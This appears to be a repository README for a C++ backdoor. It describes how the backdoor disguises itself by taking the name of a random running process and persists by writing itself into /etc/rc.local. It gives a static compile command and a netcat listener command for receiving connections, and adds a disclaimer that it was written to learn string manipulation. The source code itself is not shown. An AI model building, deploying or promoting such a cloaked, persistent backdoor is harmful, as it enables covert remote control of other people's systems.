# unencrypted-backdoor-with-process-cloaking
Unencrypted backdoor
This backdoor chooses a random running program and copies its 
name. It writes its self in the /etc/rc.local

Im not liable for damages done by this repo or the end user use.
This was coded to learn more about string manipulation using c++.
to compile:
g++ -std=c++11 -pthread main.cpp -Bstatic

listening using netcat:
nc -vlp port#
